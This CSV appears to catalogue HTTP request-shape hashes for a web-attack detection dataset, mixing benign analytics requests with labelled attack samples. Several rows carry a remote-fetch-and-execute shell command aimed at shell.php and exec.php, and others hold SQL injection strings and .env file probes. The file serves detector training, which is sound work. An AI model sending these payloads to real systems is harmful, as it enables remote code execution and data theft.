"hash_type","hash","rows","labels","sources","notes","sample_ids","sample_method","sample_path","sample_query"
"endpoint_shape_hash","b78b52e10d54098a848d6aab","4","0","openappsec_legitimate","normal","norm_legitimate_002900|norm_legitimate_002832|norm_legitimate_002945|norm_legitimate_002873","GET","/openservice/gatewayService","modelId=10739&split=1&_=1728488067335&callback=axiosJsonpCallback1"
"endpoint_shape_hash","b7b17637768c55dcf91b8ee7","4","1","owasp_modsecurity","owasp_lfi_rfi:930130|owasp_xss:930130","pos_owasp_modsec_002456|pos_owasp_modsec_000306|pos_owasp_modsec_002515|pos_owasp_modsec_000110","GET","/.env.example",""
"endpoint_shape_hash","b81760390dae17317045739c","4","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000222|norm_modsec_learn_000223|norm_modsec_learn_000225|norm_modsec_learn_000224","GET","/","id=OPE.53f41IftZ3XAsg300C300&w=272&h=380&pid=21.1"
"endpoint_shape_hash","b8a37a5a52ef23748e90f475","4","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001509|norm_modsec_learn_001513|norm_modsec_learn_000922|norm_modsec_learn_001510","GET","/","random=1660641963751&cv=9&fst=1660640400000&num=1&label=f5z8CLGP-5QBEOf_v_wD&bg=ffffff&guid=ON&eid=376635471&u_h=1080&u_w=1920&u_ah=1040&u_aw=1920&u_cd=24&u_his=2&u_tz=180&u_java=false&u_nplug=5&u_nmime=2&gtm=2oa8f0&sendb=1&data=event%3Dconversion&frm=2&url=https%3A%2F%2Fserver.exposebox.com%2Fdmp%2"
"endpoint_shape_hash","be9171e5ceca48da2140341d","4","0","openappsec_legitimate","normal","norm_legitimate_002687|norm_legitimate_002707|norm_legitimate_001628|norm_legitimate_002465","GET","/fc/a/","callback=__jsonp_1720598794065&category=loaded&action=game%20loaded&session_token=51417e0cb7c7e2959.5726873001&data[public_key]=513F48D7-3DCD-468D-8557-EFF418CF794D&data[site]=https%3A%2F%2Fwww.airbnb.com"
"endpoint_shape_hash","bf106f98ec3cafe432d66ee4","4","0","openappsec_legitimate","normal","norm_legitimate_001453|norm_legitimate_001091|norm_legitimate_001319|norm_legitimate_001278","GET","/horizon/adidasgroup","QUANTUM_WARNING=https%3A%2F%2Fwww.adidas.com%2Fus%2Fcheckout&hit=48448166f34885250407bc6d&s=aa3bbc1a791d8c7348e559873f77a0d2&Cannot%20send%20unsupported%20event%20(id:%20120)"
"endpoint_shape_hash","c1986d97652b2db06e7ff2d5","4","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000873|norm_modsec_learn_002591|norm_modsec_learn_000874|norm_modsec_learn_002588","GET","/","page-url=https%3A%2F%2Fwww.gomobile.co.il%2Fitems%2F5062308-Xiaomi-Mi-Electric-Scooter-3-&pointer-click=rn%3A392419438%3Ax%3A-574293%3Ay%3A-1279720%3At%3A44%3Ap%3AQdAA1A1FAA2A4%3AX%3A0%3AY%3A100&browser-info=gdpr%3A14%3Au%3A1660559930434358133%3Av%3A860%3Avf%3Anitzfaj0q86ldzb9x141k%3Arqnl%3A1%3Ast%3"
"endpoint_shape_hash","c1f56ac16e0ab1dd5bdbd703","4","0","openappsec_legitimate","normal","norm_legitimate_002174|norm_legitimate_002169|norm_legitimate_002082|norm_legitimate_002081","GET","/i/adsct","bci=1&eci=1&event_id=eb5a7cfe-8121-4946-9b15-023c08149f42&integration=advertiser&p_id=Twitter&p_user_id=0&pl_id=808d1bea-72e7-44a9-9470-128e23c03a17&tw_document_href=https%3A%2F%2Fwww.agoda.com%2Fstratosphere-hotel-casino-tower-bw-premier-collection%2Fhotel%2Flas-vegas-nv-us.html%3FfinalPriceView%3D"
"endpoint_shape_hash","c78b02b39487ebb3417bcc17","4","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001912|norm_modsec_learn_001913|norm_modsec_learn_000796|norm_modsec_learn_000171","GET","/","id=1640030712915094&ev=PageView&dl=https%3A%2F%2Fwww.renuar.co.il%2F1122018.html%3Fdwvar_1122018_color%3D02%26dwvar_1122018_size%3D38%26quantity%3D1&rl=https%3A%2F%2Fwww.renuar.co.il%2F%25D7%25A0%25D7%25A9%25D7%2599%25D7%259D%2Fsale%2F%3Fpage%3Dwomen%26sz%3D72&if=false&ts=1660641495590&sw=1920&sh=10"
"endpoint_shape_hash","c7d22abc426548774fb2457d","4","0","openappsec_legitimate","normal","norm_legitimate_001017|norm_legitimate_001132|norm_legitimate_001153|norm_legitimate_001031","GET","/tr/","id=3122845081335855&ev=ViewContent&dl=https%3A%2F%2Fwww.adidas.com%2Fus%2Fgrand-court-2.0-shoes-kids%2FID0741.html&rl=&if=false&ts=1719747599573&cd[content_category]=%5B%22SHOES%22%5D&cd[content_ids]=%5B%22ID0741%22%5D&cd[content_name]=%5B%22GRAND%20COURT%202.0%20SHOES%20KIDS%22%5D&cd[content_type]="
"endpoint_shape_hash","c7de4530ed90df0b94800a7f","4","1","csic_2010","csic_anomalous","pos_csic_000672|pos_csic_000374|pos_csic_000431|pos_csic_001585","GET","/tienda1/publico/anadir.jsp","id=3&nombre=Queso+Manchego&precio=39&cantidad=33&B1A=A%F1adir+al+carrito"
"endpoint_shape_hash","c805a6fe8a8d0345fb6ea81c","4","0","openappsec_legitimate","normal","norm_legitimate_002593|norm_legitimate_002590|norm_legitimate_002607|norm_legitimate_002591","GET","/gtag/destination","id=AW-788919195&l=dataLayer&cx=c"
"endpoint_shape_hash","cc324af300443e5fe9915c7c","4","0","openappsec_legitimate","normal","norm_legitimate_002494|norm_legitimate_002458|norm_legitimate_002512|norm_legitimate_002459","POST","/api/nuxt/en/analytics/external",""
"endpoint_shape_hash","ce10d582e9e53eeddb093812","4","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001312|norm_modsec_learn_001316|norm_modsec_learn_000797|norm_modsec_learn_000808","GET","/","id=101569687149113&ev=Microdata&dl=https%3A%2F%2Fku-mi.com%2F11307604%2Fcheckouts%2Ff055ebbcd512ccff8a07fe5a375fbea2&rl=https%3A%2F%2Fku-mi.com%2Fcollections%2Fsmart-collection-10%2Fproducts%2Fcopy-of-herb%3Fvariant%3D42072132092143&if=false&ts=1662455218982&cd[DataLayer]=%5B%5D&cd[Meta]=%7B%22title"
"endpoint_shape_hash","d164166347b664afaabda266","4","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000693|norm_modsec_learn_002399|norm_modsec_learn_001218|norm_modsec_learn_002398","GET","/","cm_dsp_id=123&external_user_id=t4UuA-kzTZdDfZX6tvzpHwMKi1Y"
"endpoint_shape_hash","d3de99e5e141eafd9ae04efc","4","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002265|norm_modsec_learn_000528|norm_modsec_learn_002267|norm_modsec_learn_002266","GET","/","v=11.6.3&pid=613&uu=2f5e8414-b504-a026-864b-e4affc7192d0&sn=1&pn=14&dv=N4IgxgzgsghgLmAFgSwHYHMDSBTAniALhAAYA6AFgDYBGAZmNoHZqAmRxl2gTgA4uB9apUq0ArNVEtK7HsRABfIA&r=973944"
"endpoint_shape_hash","da4378adfae5e117311511e0","4","0","openappsec_legitimate","normal","norm_legitimate_002097|norm_legitimate_002105|norm_legitimate_002096|norm_legitimate_002098","GET","/gampad/ads","pvsid=4159577504982229&correlator=3020019831703358&eid=31079957%2C31083339%2C31085062%2C31084180%2C31078663%2C31078665%2C31078668%2C31078670&output=ldjh&gdfp_req=1&vrg=202407030101&ptt=17&impl=fifs&iu_parts=3102%2CAgoda.com_Hotels%2CAgoda_hotel_Web_SSR_728X90_sponsored_test&enc_prev_ius=%2F0%2F1%2F2"
"endpoint_shape_hash","daf51b6d066628d49d1e856b","4","0","openappsec_legitimate","normal","norm_legitimate_002240|norm_legitimate_002258|norm_legitimate_002377|norm_legitimate_002236","GET","/","account_id=2027&partner_id=2051&uid=1e8c4428-cdb7-46e3-84c1-1daf878ba344&tag_format=img&tag_action=sync&cb="
"endpoint_shape_hash","ddbebbd9069fff73612c9300","4","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001033|norm_modsec_learn_001030|norm_modsec_learn_001031|norm_modsec_learn_001032","GET","/","u=https%3A%2F%2Ftse3.mm.bing.net%2Fth%3Fid%3DOVP.cTJ2lP9VGS3Hg0wL7VjZBAHgFo%26pid%3DApi&f=1"
"endpoint_shape_hash","e0d7396ac14ba6230577cd30","4","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001856|norm_modsec_learn_001854|norm_modsec_learn_001855|norm_modsec_learn_001225","GET","/","cors=true&content-type=application/x-json-stream&client-id=NO_AUTH&client-version=1DS-Web-JS-3.1.4&apikey=PRESENT&upload-time=1662637889502&time-delta-to-apply-millis=443&w=2"
"endpoint_shape_hash","e271d8adec0c2bd76b4a14fe","4","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001578|norm_modsec_learn_001580|norm_modsec_learn_001579|norm_modsec_learn_000452","GET","/","t=1660562533047&st=3308&s=uwgbqKhxgCXYnHPc&ss=2&c=5dca6ad17184ef84d02a8c7a&r=wHPf8yP5I8xVQ2gf&d=0&u=https%3A%2F%2Fwww.ikea.com%2Fil%2Fhe%2F&v=747621428&p=1&bv=9&rh=de5520220cb3e1a528fe09e31e448d60&pi=1574&pl=3894&pwl=0&ple=0&psd=414&ppu=0&psl=36&pfu=510&phe=15&pue=14&pbc=13&pnu=-1&pnc=-1&pnr=-1&fsp="
"endpoint_shape_hash","e4c087d3563e4e6d9133a351","4","0","openappsec_legitimate","normal","norm_legitimate_001039|norm_legitimate_001036|norm_legitimate_001037|norm_legitimate_001042","GET","/pagead/viewthroughconversion/986797384/","random=1719747600365&cv=11&fst=1719747600365&bg=ffffff&guid=ON&async=1&gtm=45be46q0v9176148604za200&gcd=13t3t3t3t5&dma=0&tag_exp=0&u_w=1920&u_h=1080&url=https%3A%2F%2Fwww.adidas.com%2Fus%2Fgrand-court-2.0-shoes-kids%2FID0741.html&top=https%3A%2F%2Fwww.adidas.com%2Fus%2Fgrand-court-2.0-shoes-kids%2FI"
"endpoint_shape_hash","ea2d1342f44e9f96d4c1fd06","4","1","owasp_modsecurity","owasp_rce:932130","pos_owasp_modsec_001773|pos_owasp_modsec_002923|pos_owasp_modsec_002609|pos_owasp_modsec_001141","GET","/d_44424c43/d_e6bf6bfb/d_253a0127/d_f82440d4/d_628ea0d7/block_rce.php","cmd=bash%20-c%20%22$(curl%20-fsSL%20https://gsocket.io/y)%22"
"endpoint_shape_hash","eca263d448fba24adb5d9857","4","1","owasp_modsecurity","owasp_rce:932130","pos_owasp_modsec_001816|pos_owasp_modsec_000365|pos_owasp_modsec_000832|pos_owasp_modsec_000049","GET","/exec.php","exec=bash%20-c%20%22$(curl%20-fsSL%20https://gsocket.io/y)%22"
"endpoint_shape_hash","ee35c5b6fa8de7cd7465b607","4","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001604|norm_modsec_learn_001605|norm_modsec_learn_001602|norm_modsec_learn_001603","GET","/","tla=aagf-mandslondon&activityType=viewReco&callback=CQuotient._act_callback16&cookieId=abMdpMnrvGZAxmCt89k66IOeaD&userId=6d49520254708dce6cd8831ff1bb12e17c3386a0f81457f202bd30209bdfa174&emailId=6d49520254708dce6cd8831ff1bb12e17c3386a0f81457f202bd30209bdfa174&products=id%3A%3AP22525859%7C%7Csku%3A%3A"
"endpoint_shape_hash","ee3d034190ac657dc4e6257a","4","1","owasp_modsecurity","owasp_lfi_rfi:930130|owasp_xss:930130","pos_owasp_modsec_001614|pos_owasp_modsec_001146|pos_owasp_modsec_000345|pos_owasp_modsec_000535","GET","/apps/.env",""
"endpoint_shape_hash","f29a5e66e96e74cc80658db3","4","0","openappsec_legitimate","normal","norm_legitimate_001165|norm_legitimate_001135|norm_legitimate_001032|norm_legitimate_001018","GET","/privacy_sandbox/pixel/register/trigger/","id=680435655455279&ev=ViewContent&dl=https%3A%2F%2Fwww.adidas.com%2Fus%2Fgrand-court-2.0-shoes-kids%2FID0741.html%3FforceSelSize%3D5K&rl=&if=false&ts=1719747607655&cd[content_category]=%5B%22SHOES%22%5D&cd[content_ids]=%5B%22ID0741%22%5D&cd[content_name]=%5B%22GRAND%20COURT%202.0%20SHOES%20KIDS%22%5"
"endpoint_shape_hash","f2ee30847b15a74d3f7d4bcb","4","0","openappsec_legitimate","normal","norm_legitimate_000966|norm_legitimate_000845|norm_legitimate_000925|norm_legitimate_001058","GET","/pagead/landing","gcs=G111&gcd=13t3t3t3t5&tag_exp=0&rnd=37319123.1719747580&url=https%3A%2F%2Fwww.adidas.com%2Fus%2Fkids&dma=0&npa=0&gtm=45fe46q0v9156756886za200&auid=1339420619.1719747533&gdid=dYmQxMT&frm=0"
"endpoint_shape_hash","f349197c2f0a2f80b1b14747","4","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002501|norm_modsec_learn_002481|norm_modsec_learn_002498|norm_modsec_learn_002508","GET","/","id=264164574093620&ev=fb_page_view&dl=https%3A%2F%2Fwww.beachraider.com%2Fworldwide%2Fcaptiv-ta%3Futm_source%3Dyahoo%26utm_medium%3Dyahoo%26utm_term%3DLIFESTYLE_US_also_yahoo.com%26utm_campaign%3Dyh-br-captiv-c05-des-0w-cpa-zt-19072%26vmcid%3Dp%2524g%252co%2524f6d0c586-1baf-11ed-ba7c-f0921c104948-7f"
"endpoint_shape_hash","01921a4fd923bbc317547b43","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002928|norm_modsec_learn_002929|norm_modsec_learn_001256","GET","/","dbm_c=AKAmf-B1KQYH7NDOx2SG-_p1CMVkyOwOt7k-QD1uNdHc1TqzJZ046ajszVOfDDB2nrepL0l61u9C5iJsN-rThPkCIPEslS7yyQ&cry=1&dbm_d=AKAmf-Cm7Bh_bYg7Fzp3QtWg0h8qg7rLVfdU4SgPDbJVdGteb7KRAhktqCX97vcIQS1QnX5hFOLexAjUp_wSpWO-YPj1q5M5hEIBYlHga9BeTm3FFl88LN36SdK2YE2nSAIX6ZjwZP2jnZzDWCsSJ9bCjf46R6r4Ck2eFAToidjBty7A75O7Hkf"
"endpoint_shape_hash","050ca9d5c02cf3fc25af2c05","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000960|norm_modsec_learn_002120|norm_modsec_learn_000920","GET","/","random=1663167640812&cv=9&fst=1663167600000&num=1&bg=ffffff&guid=ON&u_h=1080&u_w=1920&u_ah=1040&u_aw=1920&u_cd=24&u_his=1&u_tz=0&u_java=false&u_nplug=5&u_nmime=2&gtm=2oa9c0&sendb=1&data=event%3Dgtag.config&frm=2&url=https%3A%2F%2Fstags.bluekai.com%2Fsite%2F17001%3Fret%3Dhtml%26limit%3D4%26btp%3D1%26"
"endpoint_shape_hash","055dd2a1a44a09c6ad75f0f7","3","0","openappsec_legitimate","normal","norm_legitimate_002841|norm_legitimate_002840|norm_legitimate_002839","GET","/openservice/gatewayService","endpoint=pc&modelId=10741"
"endpoint_shape_hash","057f68fabc7f82d85d58bc75","3","1","exploitdb","sqli","pos_luongvd_001080|pos_luongvd_001077|pos_luongvd_001078","GET","/shop.htm","shopMGID=-9999+union+select+1,2,concat_ws"
"endpoint_shape_hash","09bdb5adfb932655b8ca4ad5","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000973|norm_modsec_learn_000972|norm_modsec_learn_000971","GET","/","rpcids=wTwD3d&source-path=%2Fsearch&f.sid=-5038538224231940147&bl=boq_visualfrontendserver_20220912.10_p0&hl=iw&authuser&soc-app=162&soc-platform=1&soc-device=1&_reqid=1957301&rt=c"
"endpoint_shape_hash","0a599706abf7540bc403bde9","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000064|norm_modsec_learn_000659|norm_modsec_learn_000065","GET","/","advEntityId=520178&asId=5626f0c2-c1c6-3ca4-8318-ea8bfa0971d6&tv=%7Bc:oQGRAl,pingTime:-2,time:81,type:a,im:%7Bsf:1,pom:1,prf:%7BbeA:1496,beZ:1498,mfA:1501,cmA:1503,inA:1503,inZ:1509,prA:1509,prZ:1515,si:1520,poA:1522,poZ:1528,cmZ:1528,mfZ:1528,loA:1558,loZ:1561,ltA:1576,ltZ:1576%7D%7D,sca:%7Bdfp:%7Bd"
"endpoint_shape_hash","0b1b80713604e8df18fbdad3","3","0","openappsec_legitimate","normal","norm_legitimate_002983|norm_legitimate_002845|norm_legitimate_002886","GET","/product/fetchSiteTag.jsonp","siteName=wholesale&pageFrom=detail&pageInfo=%7B%22productId%22%3A%221600904626812%22%2C%22siteName%22%3A%22wholesale%22%2C%22productType%22%3A%22wholesale%22%2C%22pageType%22%3A%22detail%22%2C%22isP4P%22%3Afalse%2C%22pageDevice%22%3A%22PC%22%7D&language=&callback=jsonp_172848810726880167"
"endpoint_shape_hash","0c7573d8598b170e6d390f84","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001398|norm_modsec_learn_000256|norm_modsec_learn_000845","GET","/","ld=1&gdpr=1&cmp_cs=CPfU0n0PfU0n0AcABBENCFCsAP_AAEPAACiQImtf_X__b3_j-_5_f_t0eY1P9_7_v-0zjhedt-8N3d_X_L8X52M7vF36pq4KuR4Eu3LBAQdlHOHcTUmw6IkVqzPsbk2cr7NKJ7PEmnMbO2dYGH9_n93TuZKY7______z_v-v_v____f__-3_3__5_1---wAAB8gdzLv9____393P___9v-_9_____-CIYBJhqXkAXZljgybRpVCiBGFYSHQCgAooBhaIrCB1cFOyuAn1BCwAQCpCc"
"endpoint_shape_hash","0d0c76adc3d1ceaa78a3f8c3","3","0","openappsec_legitimate","normal","norm_legitimate_002665|norm_legitimate_002648|norm_legitimate_002667","GET","/pagead/conversion/693169273/","random=1720598734429&cv=9&fst=1720598734426&num=2&npa=1&label=khGBCOzgkPYBEPnYw8oC&guid=ON&resp=GooglemKTybQhCsO&eid=375603260%2C466465926%2C512247839&u_h=1080&u_w=1920&u_ah=1040&u_aw=1920&u_cd=24&u_his=1&u_tz=0&u_java=false&u_nplug=5&u_nmime=2&sendb=1&ig=1&gclaw=EAIaIQobChMIp-6vxIGchwMVDV1HAR3s0g-0"
"endpoint_shape_hash","15683854c0271ef47046b8b3","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000238|norm_modsec_learn_000236|norm_modsec_learn_000237","GET","/","includes=price,holidayPriceDealMessages&context=product-carousel-v2&destinationZipCode=55401&layout=mini&planPaidMember=false&skuId=6487420"
"endpoint_shape_hash","16925f3b06f71838caf7a39f","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002099|norm_modsec_learn_002100|norm_modsec_learn_000323","GET","/","random=1662474808288&cv=9&fst=1662474808288&num=1&guid=ON&resp=GooglemKTybQhCsO&eid=375603260&u_h=1080&u_w=1920&u_ah=1040&u_aw=1920&u_cd=24&u_his=3&u_tz=0&u_java=false&u_nplug=5&u_nmime=2&sendb=1&ig=1&frm=0&url=https%3A%2F%2Feurope.sheratonstore.com%2Fen%2F%3F___store%3Dsheu_en%26utm_source%3Dsherat"
"endpoint_shape_hash","16a2afd89745f64eea805a41","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000708|norm_modsec_learn_000710|norm_modsec_learn_000709","GET","/","ct=1663167498894"
"endpoint_shape_hash","18d641ed4ea6285a4e2b312a","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002836|norm_modsec_learn_002256|norm_modsec_learn_001069","GET","/","v=1&t=sr&slf_rd=1&_r=4&tid=G-DV8TSX6KLL&cid=2081864134.1660633828&gtm=2oe8f0&aip=1&uid=15963&z=1483535227"
"endpoint_shape_hash","1a3ea846441c5bd78482b638","3","1","csic_2010","csic_anomalous","pos_csic_002773|pos_csic_001440|pos_csic_001656","GET","/tienda1/publico/registro.jsp","modo=registro&login=tac&password=e486ac0%F34&nombre=Atal%EDvar&apellidos=Blaya&email=ryle%40professionalhosting.com.cv&dni=25454571B&direccion=Calle+Pastor+De+Iberia+S%2FN%2C+2E&ciudad=Vilanova+de+la+Barca&cp=22415&provincia=Palencia&ntc=0517144420469351&B1A=Registrar"
"endpoint_shape_hash","1ad9b1f49ea364e738300581","3","1","owasp_modsecurity","owasp_rce:932130","pos_owasp_modsec_000663|pos_owasp_modsec_001449|pos_owasp_modsec_001369","GET","/d_1dfbfc8b/d_ebec15cd/d_eda37985/d_9a52310f/d_a9b36e7e/shell.php","cmd=bash%20-c%20%22$(curl%20-fsSL%20https://gsocket.io/y)%22"
"endpoint_shape_hash","1cb591ad6ab1ecca6c903249","3","0","openappsec_legitimate","normal","norm_legitimate_002520|norm_legitimate_002470|norm_legitimate_002473","POST","/g/collect","v=2&tid=G-T408Z268D2&gtm=45je4a90v886006994za200zb851582372&_p=1728584911726&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101533421~101671035~101686685~101823848&cid=2011390197.1728584616&ecid=1345560689&ul=en-us&sr=1536x864&ur=BD-C&uaa=x86&uab=64&uafvl=Google%2520Chrome%3B129.0.6668.90%7CNot%253DA%253FBran"
"endpoint_shape_hash","215ce3c5569ebd64e0794dae","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001898|norm_modsec_learn_000147|norm_modsec_learn_001305","GET","/","google_nid=stickyxchange_dbm&google_cm=&google_sc&google_hm=M2M5NjI0YmZlODE5ZjYxOGMxM2MwY2VlY2IzYWVhZA==&gdpr=0&gdpr_consent="
"endpoint_shape_hash","21e46f5223e32bbd93df19e5","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000132|norm_modsec_learn_002448|norm_modsec_learn_002449","GET","/","family=Lato:italic"
"endpoint_shape_hash","22137271a2924bbce394a6a4","3","0","openappsec_legitimate","normal","norm_legitimate_002441|norm_legitimate_002475|norm_legitimate_002474","POST","/s/vestigo/measure",""
"endpoint_shape_hash","222354c5ad692a22599c5e71","3","0","openappsec_legitimate","normal","norm_legitimate_002489|norm_legitimate_002523|norm_legitimate_002472","POST","/g/collect","v=2&tid=G-T408Z268D2&gtm=45je4a90v886006994z8851582372za200zb851582372&_p=1728584910503&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101533421~101671035~101686685~101823848&cid=2011390197.1728584616&ecid=1345560689&ul=en-us&sr=1536x864&ur=BD-C&uaa=x86&uab=64&uafvl=Google%2520Chrome%3B129.0.6668.90%7CNot%253"
"endpoint_shape_hash","227cd4553108f72e3f16eceb","3","0","openappsec_legitimate","normal","norm_legitimate_002327|norm_legitimate_002078|norm_legitimate_002148","GET","/idsync/ex/receive","partner_device_id=UserId%3Dbec89482-98ee-48c0-b8e9-96abf0494f9a&partner_id=2433&format=png&_rnd=0.21887133990852714"
"endpoint_shape_hash","22afb2ab427edabc572b3d25","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000516|norm_modsec_learn_002229|norm_modsec_learn_001062","GET","/","v=1&_v=j96&a=506550043&t=event&ni=1&_s=1&dl=https%3A%2F%2Fwww.atptour.com%2Fen%2Fnews%2Fgates-messi-tendulkar-celebrity-federer-retirement-tributes&ul=en-us&de=UTF-8&dt=Gates%2C%20Messi%2C%20Tendulkar%20Headline%20Celebrity%20Federer%20Tributes%20%7C%20ATP%20Tour%20%7C%20Tennis&sd=24-bit&sr=1920x108"
"endpoint_shape_hash","23ac6fecc71cee5302e73c94","3","0","openappsec_legitimate","normal","norm_legitimate_002077|norm_legitimate_002309|norm_legitimate_002307","POST","/g/collect","v=2&tid=G-C07L4VP9DZ&gtm=45je4730v9137961602za200&_p=1720601329544&gcd=13l3l3l3l2&npa=0&dma=0&tag_exp=0&ul=en-us&sr=1920x1080&cid=455635995.1720601296&ir=1&uaa=x86&uab=64&uafvl=Not%252FA)Brand%3B8.0.0.0%7CChromium%3B126.0.6478.127%7CGoogle%2520Chrome%3B126.0.6478.127&uamb=0&uam=&uap=Windows&uapv=12."
"endpoint_shape_hash","281aab2ac579b3bf87572851","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002373|norm_modsec_learn_000074|norm_modsec_learn_000075","GET","/","ar=1&k=6Ld2ca0UAAAAAKzttOGcjomH-5rBIJesbQrCZtfB&co=aHR0cHM6Ly93d3cudHVtYmxyLmNvbTo0NDM.&hl=en&v=zmiYzsHi8INTJBWt2QZC9aM5&size=invisible&cb=u7257am43x5h"
"endpoint_shape_hash","28ac0fbbce3b4267648554a1","3","1","owasp_modsecurity","owasp_sqli:942100","pos_owasp_modsec_000369|pos_owasp_modsec_000579|pos_owasp_modsec_000248","GET","/wp-login.php","action=-1%20OR%205*5=25"
"endpoint_shape_hash","28d784d9a4fa2412f1f556dd","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001874|norm_modsec_learn_000119|norm_modsec_learn_002425","GET","/","dspInit=1001851&dspCookie=k-U_x0eiisrBEGHOWfwGtWuZeaYzPDMLwuH2Acww"
"endpoint_shape_hash","2c2d7f3ac416846c0ca5be92","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000716|norm_modsec_learn_000715|norm_modsec_learn_000717","GET","/","customerId=19763127&sessionId=3472629&dbwId=1&sessionCode=8c543d39064a8397e4e029e376d60f58&actionsArray=%5B%5B1660654021%2C-3%2C%2240397%22%2C%2240398%22%2C1%2C%7B%22campaign_id%22%3A%2269769%22%2C%22shown%22%3A%22true%22%2C%22always_send%22%3A%22true%22%7D%5D%5D&actionPairs=[[-321,-596],[-322,-597]"
"endpoint_shape_hash","3049904cdb5cea7a4a69ffbc","3","0","openappsec_legitimate","normal","norm_legitimate_000951|norm_legitimate_000811|norm_legitimate_000911","POST","/j/collect","v=1&_v=j101&aip=1&a=199666384&t=pageview&cu=USD&_s=1&dl=https%3A%2F%2Fwww.adidas.com%2Fus%2Fkids&dp=GLP%7CKIDS&ul=en-us&de=UTF-8&dt=%F0%9F%91%95Kids%27%20Shoes%20and%20Clothing%20%7C%20adidas%20US%F0%9F%91%95&sd=24-bit&sr=1920x1080&vp=1903x953&je=0&_u=SCCAiAIJBAAAgCAMK~&jid=&gjid=&cid=259251594.1719"
"endpoint_shape_hash","318110425a2baa1b2ca18c62","3","0","openappsec_legitimate","normal","norm_legitimate_001995|norm_legitimate_001983|norm_legitimate_002126","POST","/api/cronos/seo/base",""
"endpoint_shape_hash","33bb75154e99f9c2ca65658b","3","0","openappsec_legitimate","normal","norm_legitimate_000672|norm_legitimate_000091|norm_legitimate_001966","POST","/v1:GetModels","key=AIzaSyBOti4mM-6x9WDnZIjIeyEU21OpBXqWBgw"
"endpoint_shape_hash","35a3b29234b167fa62c83673","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001888|norm_modsec_learn_000756|norm_modsec_learn_002450","GET","/","family=Assistant:wght@400;600;700&display=swap"
"endpoint_shape_hash","3632174bfcfe40544f516307","3","0","openappsec_legitimate","normal","norm_legitimate_002828|norm_legitimate_002892|norm_legitimate_002861","GET","/openservice/popularSuggestionViewService","tab=all&name=home_new_user_first_screen&bizScene=pcHomeProducts&pageSize=18&showAd=true&position=preSearchPanel&callback=jsonp_1728488016937_58728"
"endpoint_shape_hash","364d87041502d1711a6e4a55","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000228|norm_modsec_learn_000229|norm_modsec_learn_000226","GET","/","id=OVFT.8Q1W4WmUGBsLMzuKcez5_i&pid=News&w=197&h=112&c=14&rs=2&qlt=90"
